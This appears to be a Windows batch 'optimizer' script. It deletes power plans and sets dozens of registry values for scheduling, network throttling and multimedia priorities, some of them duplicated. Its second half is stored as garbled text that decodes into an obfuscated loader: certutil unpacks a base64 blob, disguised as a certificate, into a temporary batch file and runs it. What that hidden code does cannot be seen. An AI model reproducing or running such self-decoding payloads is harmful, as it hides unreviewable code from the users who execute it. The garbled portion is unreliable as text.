powercfg -delete 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c
powercfg -delete a1841308-3541-4fab-bc81-f71556f20b4a
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "268435455" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Priority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "BackgroundPriority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Priority" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "BackgroundPriority" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Priority" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Priority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
挦獬਍敀档⁯景⁦਍楔汴⁥縥の਍潣潬⁲䈰਍捥潨ന攊档⁯††††汐慥敳眠楡⹴⸮愠眠楨敬䰠慯楤杮搠瑡⁡⸮⸮਍䕃呒呕䱉ⴠ⁦搭捥摯⁥┢晾∰∠吥浥╰䱜癥慩桴湡彮彟戮瑡•渾汵㈠☾‱਍汣൳∊吥浥╰䱜癥慩桴湡彮彟戮瑡ഢ䔊楸൴ⴊⴭⴭ䕂䥇⁎䕃呒䙉䍉呁ⵅⴭⴭ਍兄䅰坚潎祢療浚杙兄㙯楏䍂塙橒䕡癤䕤歆坢畬䅉䬰楏琰卌琰卌琰卌琰卌琰਍卌琰卌琰卌琰卌琰卌琰卌琰卌琰卌朰兄印啒朰䍉琰楐䑂䝡橖祡浂㍢杉䝣祖਍坢穬㉣癬湢杍兄⭯湢獖䑉⭉橊杅楉呖噗啎啒匱ご唹噊穸塥ぎ坚稰汍橸坙獎਍祣氵䝥楕䍉汉ㅕ呬䕖乖歕倹䍖捖㍣穬䝤瑖積捊㉙甹浚湬䡘㕎㍣汒卢杉兄印਍啒朰卌⬰䕉浬䝉祖浣礹䝉獚坙杣㉣ざ䍌㍂博歂祢畂㍢村䝡㉆博桂䝚瀱楢朴਍兄灰楚湁坊祖浣礹䝢㉖坚汷祊佂噒杅穊湁䍉杧兄杯䍉杁坚潎祢卂塚ㅆ塚ぎ਍坡渵䝉歆坢畬塡ぎ浣う塡汚䡉祂塡灚䝢湖塚畍楌朴兄杯䍉杁㉚〹祢噂啑兎਍浣琹䡣村兄灯䝉獖㉣杕䍋湂㍢癒䝉癤䕤歆坢畬䍉杫兄㙯啖䑆䡕癊塢あ䅉䬰਍䍉杁䝉橖䝡朸㉕ざ䙉䉖祑㥁䕉祎坚う啚椹浡橖䙤漴汉潎坚獸歌睆䝣灸㉙う਍坡甹汉瀴䑉朴楉ざ坚眱噊湸塚桒䝚瀱楢㈵湙楍䅉䬰䍉杁䝉橖䝡朸啖䑆汌潎਍坚獸塒汨㍙ざ博楁塊稵䍍獉䍉楉䍌楁楉杷湉ㅊ浢穆楉杷卍⭁楐楁塊汒塢汁਍䝘汤䝤歆坢畬湌楚祣杉兄杯䍉杁楉ざ坚眱噊湸塚桒䝚瀱楢㈵湙楍䅉䬰䍉杁਍䝉㑖塡村が杉兄㙯㉚〹坑瑒坡朴兄杯䍉杁坡杙塚灨㍣村楉ざ坚眱噊湸塚桒਍䝚瀱楢㈵湙楍䍉杧䝚獖䍉汉䝤瑖䍣捖㉚ざ坙瑒坡甴浤穊楉灁䅉䬰䍉杁䡉ㅂ਍㉣歨䍉汉け汑楉乁楃杁䍉䑂䍒癁䍒楁塊欵䑣楁䅉䬰楏琰卌琰卌琰卌琰卌琰਍卌琰卌琰卌琰卌琰卌琰卌琰卌琰卌琰䅉䬰㉣ざ䙉䑎歕公䑖椰噊䙒噔汁䍘卖਍啑䔵ご氰卌卖啑䔵ご氰卌卖啑䔵ご氰卌卖啑䔵ご氰湌楚祣杉兄䅰坚潎祢療਍浚杙兄瑰㉢汒䑉睕䑌睉䅉䬰㉙橨䍣㉁呎睁卍乁浃獎祣乁歃啂塡獒博杁ㅑ啖਍歔啖兄橰㉢癸楣睁䍍乁浃橖䝡甸䅉䬰兄ば坡氱㍢ざ䍉〹䑉杉が倵汑䙊啑杳਍浐ㄵ䍢乁橃浰䝢㑖㍣穎䅉䬰㉙穸䅉䬰㉙猹㍢杉㉎杙兄䙰け偨䑉朴さ晤浖穬਍䝤晆䝖睎塓時䝕う㉙畧浣湖䙉灤浢癒㍤杍浕湖塡ぎ湣杫坒灒䝤礹䙉汚湣灎਍㉢朴华眴䍍杁䅉䬰啒䥎祔⭁楐呂ㅒ圹塡ぎ噙唹㍙䩂䙣儹塙橒䍡礵坚杣し䱨਍噒晬ㅑ卖歕佖䙖嘹さ卖䕘癎湢祒㉢杷䝕畆坚捸坔ㄹ㉣摖䅉䬰啒䥎祔⭁楐呂਍ㅒ圹塡ぎ噙唹㍙䩂䙣儹塙橒䍡礵坚杣汉瑎㉢〹䕡瘱塤汎䕗ㅎ湣汚橉漱塚㙧਍䑍獁䑍獁䑍獁䑍獁䑍獁䑍獁䑍獁䑍獁呏獁呏獫呏獫䑍獅䑍獁䑍獁䑍獁䑍獁਍橍獁積獍䍘乁楃杁積獍䑍獍䑍獁䑍獁䑍獁䑍獁橙獁㉙獍㉙獍䑍獑䑍獁䑍獁਍䑍獁䑍獁䑎獁橎獙橎獙䑍獙䑍獁䑍獁䑍獁䑍杁兄䙰け偨䑉⬴䙉䡎ㅘ灚㍣桒਍ㅘ橒䕣睬ㅘ桂䝤潎湌汊祚楁㉕瘱㍢潒坔ㄹ㉣婖㍑祖浤楕坐汨䑥睯䍍睷䍍睷਍䍍睷䍍睷䍍睷䍍睷䍍睷䍍睷䍍睷䍍穷䍏睷䍍睷䍍睷䍍睷䍍睷䍍睷䍍睷䍍捸਍䅉䬰䍉㍁䍍睷䍍睷䍍睷䍍睷䍍睷䍍睷䍍睷䍍桸䍏睷䍍睷䍍睷䍍睷䍍睷䍍睷਍䍍睷䍍汸䍍睷䍍睷䍍睷䍍睷䍍睷䍍乁歃䑖䕓朸橐朴さ晤浖穬䝤晆䝖睎塓時਍䝕う㉙畧浣湖䙉䥴こ婖じ䵎噑呎噒晎歕倹䙖䕸塡汊㍙癒湣捬浑橆㉡祤㍢畖਍䙚穸䝡獖䝢㑖䕘癎湢汒䡥乒坚ㄵ䝓畆䝚汸湣摎䅉䬰啒䥎祔⭁楐呂ㅒ圹塡ぎ਍噙唹㍙䩂䙣儹塙橒䍡礵坚杣し䱨噒晬け䉸ㅕ䙎ㅕ匹ご唹䕘灒浣橖䝤礹噥䍸਍坙牎㍚癊坤欵䡘潎坚獸塚捨㉑甹䝤㑖䕤氱湢䥖坙欵䝢祖ㅣ杷浒獬噚㕎浢䙎਍䙥朰兄䙰け偨䑉⬴䙉䡎ㅘ灚㍣桒ㅘ橒䕣睬ㅘ桂䝤潎湌汊祚䅂卐楉䅉䬰啒䥎਍祔⭁楐呂ㅒ圹塡ぎ噙唹㍙䩂䙣儹塙橒䍡礵坚杣し䱨噒晬け䉸ㅕ䙎ㅕ匹ご唹਍䕘灒浣橖䝤礹噥䍸坙牎㍚癊坤欵䡘潎坚獸塚捨㉑甹䝤㑖䕤氱湢䥖坙欵䝢祖਍ㅣ佸此睎䕢汒㉣ぴ㍢䑂㉢〵塚と単乁歃䑖䕓朸橐朴さ晤浖穬䝤晆䝖睎塓時਍䝕う㉙畧浣湖䕉㥁楉杉兄䙰け偨䑉⬴䙉䡎ㅘ灚㍣桒ㅘ橒䕣睬ㅘ桂䝤潎湌汊਍祚扂䕓䙴噗䐹䕔呆さ呖ㅘ偊ㅔ捒䝒祬坚ぎ㍢㕊䕘桊㉙湴浣ㄹ浢捒㉣汨䝢汸਍䙥䑸㉢〵塚と坔畖啤桨浢獒塚穊䙘潎塙灊浢摤䅉䬰啒䥎祔⭁楐呂ㅒ圹塡ぎ਍噙唹㍙䩂䙣儹塙橒䍡礵坚杣䑑椰楉乁湃汊㉚歖塡村㍌杍さ晤浖穬䝤晆䝖睎਍塓時䝕う㉙畧浣湖䅉䬰䝚獖䙉䡎ㅘ灚㍣桒ㅘ橒䕣睬ㅘ桂䝤潎湌汊祚乁浃獎਍祣乁浃癤䝤朸㉕瘱㍢潒䅉䬰汏瑎㉢〹䍡乁浃氵䡤潎䝉畬䍤あ㍙杁㉣ざ䝉獤਍㉢桊䍢浂塙ぎ㍢求橢氱浢楆䝢歖䅉䬰浢ざ㉣杧坡〵塚浊坙汎䝉睬橤村㉣ざ਍䡉ㅎ浙畬䝤祖浚橆博楁㉖瑫浒楫䝉〱呤氰噔噒半穂䝤礹呚眱塚穊塡ぎ坚〵਍䅉䬰㉤瀱祙睂浣樹塚穎䡉潤塚汊䝉栵坢㥕湉㉎㉙癨㍣畑塚汨楉䑂啑䵸䡉汎਍䡤祂坡礹塡㕒䍉祊坚獆䝤瑬博杉兄異塚穒䍡灂浢杕䝤睎䡉潎㍢杣㉚癸浙獆਍䅉䬰㉤瀱祙睂浣樹塚穎䡉潤塚汊䝉栵坢㥕汉灚坢塖㍢獊䍚氵䝥楕䕉䉎䕔杷਍㉣ざ䡣灊㍢灊䡤杫湉汊坙へ坡氱楉乁浃獎祣乁浃癤䝤㘸啍汊䍤乁橃硯浑ざ਍䅉䬰浢ざ㉣杧坡〵䡉橒䍣穂塚村㉚癸浙獆䝉ㅆ䝤〹坤瀵浢㥣䝡湬䍡乁浃氵਍䡤潎䝉畬䍤あ㍙杁㉣ざ䝉獤㉢桊䍢歂㉙㥅坚栵浙汸䍚乁浃氵䡤潎䝉畬䍤あ਍㍙杁㉣ざ䝉獤㉢桊䍢祂㍣㥍坚栵浙汸䍚乁浃氵䡤潎䝉畬䍤あ㍙杁㉣ざ䝉獤਍㉢桊䍢畂塚歒坢㥅坚栵浙汸佚㕃䍨乁浃氵䡤潎䝉畬䍤あ㍙杁㉣ざ䝉獤㉢桊਍䍢あ坡氱㍣桒塢穂坐畖坙獊坚村兄異塚穒䍡灂湢村䝤睎䡉汎䍤湂䝢椹坙杷਍浢甹㉣橆㍡お䡤汊㉣獬坡畖㍙㥫㍙橒䍣乁湃瑤坡杍䡣癊㉙穖祣㍂䝡祖博畂਍坙氱卐坊坡氱㉖礹䝢畑塚汨楉䑂啑䵸䡉汎䡤祂坡礹塡㕒䍉祊坚獆䝤瑬博杉਍兄汰䡤潎䝉畬䍤あ㍙杁㉣ざ䝉汨塤灊㍣灒㍙杍坚栵浙汸䍚乁浃氵䡤潎䝉畬਍䍤あ㍙杁㉣ざ䝉獤㉢桊䍢橂䝡瑬浢㕖坐灒㉣楆䝢歖䅉䬰浢ざ㉣杧坡〵䡉橒਍䍣穂塚村㉚癸浙獆䝉ㅆ䝤〹坤瀵浢獤塚汚䑢漱坡潤䅉䬰浢ざ㉣杧坡氵䡉橒਍䍣穂䝡㌹䝉獤㉢桊䍢乁浃氵䡤潎䝉畬䝤祖浚橆博灂䡣す䡉汎䍤灂湢汒浣桚਍㉙杕歉畖䝤汨浣氵䍤杉塢ㅒ呐ぅ呎杁兄㍰坢橬䡉祂㉢汎㍣杍㉤汨浣杕浢瑆਍呚椰塚睨䝢礹塚畉塚汨楉䑂啑䵸䡉汎䡤祂坡礹塡㕒䍉祊坚獆䝤瑬博杉兄橰਍䡢杍䅉䬰㉤瀱祙睂浣樹塚穎䡉潤塚汊䙉祂㉢汎㍣䩎䑚氰䝣歬半䑂啑䵸䡉汎਍䡤祂坡礹塡㕒䍉潊坡潤楉乁浃獎祣乁浃氵䡤潎䝉畬䍤あ㍙杁㉣ざ䡉ㅎ䡣獂਍坚氱湢桒䍢あ坚眱䝢う呚樱塤ぎ㉢朰坡㍎呐ㅅ䅉䬰浢ざ㉣杧坡〵䡉橒䍣穂਍塚村㉚癸浙獆䝉桚㍣癒䝣畖坐畖坙獊坚村兄異塚穒䍡灂湢汒浣桚㉙杕䝤睎਍䡉潎㍢杣㉚癸浙獆䅉䬰浢ざ㉣杧坡〵塚浊坙汎䡉橒䍣穂塚村㉚癸浙獆䝉ㅆ਍䝤〹坤瀵浢獤塚汚䑢氱䡥求浣瑬坚〵坙杷兄異塚穒䍡灂湢汒浣桚㉙杕䝤祖਍坚癒䡉汎䍤祂坚祚塚潎坡〵塚㉊坙㥷呍睁䅉䬰浢ざ㉣杧坡〵䡉橒䍣穂塚村਍㉚癸浙獆䝉㕨㍣桒湣㥑坚栵浙汸䍚乁浃氵䡤潎䝉畬䝤祖浚橆博灂䡣す䡉汎਍䍤灂湢汒浣桚㉙杕汉灤坌灚楉瑂塚祒坡㥍橎杕兄㍰坢橬䡉祂㉢汎㍣杍㉤汨਍浣杕浢瑆呚椰䝤穆㉡癨㍣畑塚汨楉䑂啑䵸䡉汎䡤祂坡礹塡㕒䍉潊坡潤楉乁਍浃獎祣乁湃瑤坡杍䡣癊㉙穖祣㍂䝡祖博畂坙氱卐瑊塣㉎祙氵䝥楕䕉䉎䕔杷਍㉣ざ䡣灊㍢灊䡤杫浉灨㉚杧䡣灊㍢灊䡤楫䅉䬰㉙穸䅉䬰浢ざ㉣杧坡〵塚浊਍坙汎䡉橒䍣穂塚村㉚癸浙獆䝉癎浢汤㍣灒㉢眵浣㈹坡汒橣樱䝤睎䅉䬰浕湖਍浌㑖博桂䝚村歉䱨噒晬ㅑ卖歕佖䙖嘹さ卖䕘癎湢祒㉢杷䝕畆坚捸䝒穖㍡癒਍䍣杉㍌杙歉桎浣ざ䝖瑬坚ㄹ䍤杉㍌村歕䡖じ塒ㅔ䕊䍉欹䍉硉䑍睁楉癁楚乁਍汃汊祚氵䝥杕坙歒䍉䥊こ婖じ噎汕䙊汔晒噖䙎汕䑸㉢〵浣猹䙉桂浢獖䕘汒਍㉣ぴ㍢楁䍉㈹䍉䵊㍢䵤塚汚䕢癨㉢穴䝖瑬坚ㄹ䍤杉㍌村歕䡖じ塒ㅔ䕊䍉欹਍䍉硉䑍睁楉癁楚乁浃癚楣癁楚楁塤汎浙橆㍡楅䍉汕卡灂楢潁䡙汊祚硂坤祖਍卥䥂こ婖じ偸け䵆じ䈱け䩨歔捖ㅕ呬䕖乖䕘ㅎ湣汊湢䑒㉢〵浣猹㉕ざ䙘汎਍湣灚㉙穖䙘橒䝣睬䙘桂浣瑆塚汒湣捎坓〵塚浊坙汎㉣灁䝉癒䍉杧兄印坚畣਍塚汨䝉歆䍚汁坊杫㍌杙汉䑒䕕瘵䝒獖塙楫䍉欹䍉硉楉癁䍤卂啒晤䙒偤歕村਍㉌杙兄印坚畣塚汨䝉歆䍚汁坊杫㍌杙汉橒䕣橆ち祚塚ㅆ坚樵卥杉㉌村橉楍਍䍉〹䙉䙊ㅒ䔹ざ匹䍒癁楚乁汃汊祚氵䝥杕坙歒䍉汕卡癁楤楁䕖兎䝒獖坑牎਍䝖橬㍡楍䍉欹䍉睉楉癁䍤卂啒晤䙒偤歕村㉌杙兄灯䑉电坤杷橍洴卍乁浃獎਍祣乁歃䑖䕓朸橐朴さ晤浖穬䝤晆䝖睎塓時䝕う㉙畧浣湖䙉䥴こ婖じ偸け䵆਍じ䈱け䩨歔捖ㅕ呬䕖乖䕘ㅎ湣汊湢䑒㉢〵浣猹㉕ざ䙘汎湣灚㉙穖䝘瘱坤獎਍塙穎䙘桂浣瑆塚汒湣摎䅉䬰啒䥎祔⭁楐呂ㅒ圹塡ぎ噙唹㍙䩂䙣儹塙橒䍡礵਍坚杣歉瘱塤汎䝒う噙ㅆ塚汖㉕㙬博㥉䡚癤浣㙑䑍睁䑍睁積杉兄䙰け偨䑉⬴਍䙉䡎ㅘ灚㍣桒ㅘ橒䕣睬ㅘ桂䝤潎湌汊祚楁㍖睂浕橖㍢歊塚晊䡖桊㉙䡖坤歬਍橉椰㉥橚䝏浒䝏歚坌硑䑍瑕䑎桂协栱橚ㅣ呌汊坚祍呏桒䝚㑙䡚椰䅉䬰啒䥎਍祔⭁楐呂ㅒ圹塡ぎ噙唹㍙䩂䙣儹塙橒䍡礵坚杣し䱨噒晬䕔䐹啑晸啔䑆䕓佬਍噒呸噗啎啒挱㍑祖浣畖䕤癎湢祒㉢呸塚捒㉕祖浤橬塚捎㉡歊㉙桸㍣捎䝕祆਍坙氱䝤祖ㅣ朰兄䙰け偨䑉⬴䙉䡎ㅘ灚㍣桒ㅘ橒䕣睬ㅘ桂䝤潎湌汊祚楁㉓㕖਍浙根浣䕒塙桒塕汖坤呖塡汰橉欱㉤礹䑚睯䑍睁䑍穁楍乁歃䑖䕓朸橐朴さ晤਍浖穬䝤晆䝖睎塓時䝕う㉙畧浣湖䍉䑊㉢电坚ぎ塔獖䝤睬䝢兖㍢お祣㥉䡚癤਍浣㙑䑍睁䑍睁䑍杁兄䙰け偨䑉⬴䙉䡎ㅘ灚㍣桒ㅘ橒䕣睬ㅘ桂䝤潎湌汊祚楁਍㉓㕖浙根浣䕒塚灚㉙䍖塙汎浔瑆博㥉歉汴坥癊塙歊㉑桸㍣楍䅉䬰啒䥎祔⭁਍楐呂ㅒ圹塡ぎ噙唹㍙䩂䙣儹塙橒䍡礵坚杣歉栱䝥瑬坤儱㍢おㅣ汎湣灚㉙歖਍橉欱㉤礹䑚睯䑍睁䑍睁祍乁歃䑖䕓朸橐朴さ晤浖穬䝤晆䝖睎塓時䝕う㉙畧਍浣湖䍉告坚欵㍔ざ䡣ざ䝖䈹䝢典㍢お祣㥉䡚癤浣㙑䑍睁䑍睁䑍杅兄䙰け偨਍䑉⬴䙉䡎ㅘ灚㍣桒ㅘ橒䕣睬ㅘ桂䝤潎湌汊祚楁㍖睂浕橖㍢歊塚晊䡖桊㉙䡖਍坤歬橉椰穥㕁橍硧橚浆坌㉙济瑕䑎ㅧ卙㔰坏祅呌硫橎㑍橚㑣浍き塏椰䅉䬰਍浣湖坚灒䍤癁祣呂ㅒ圹塡ぎ噙唹㍙䩂䙣儹塙橒䍡礵坚杣兄歰坚杷さ晤浖穬਍䝤晆䝖睎塓時䝕う㉙畧浣湖䅉䬰㉙穸䅉䬰㉚〹穢浰䝢㌹䅉䬰浏獚㍢杣兄灰਍䝣癎浢灚祚癁浣畖塚杣兄灰䝣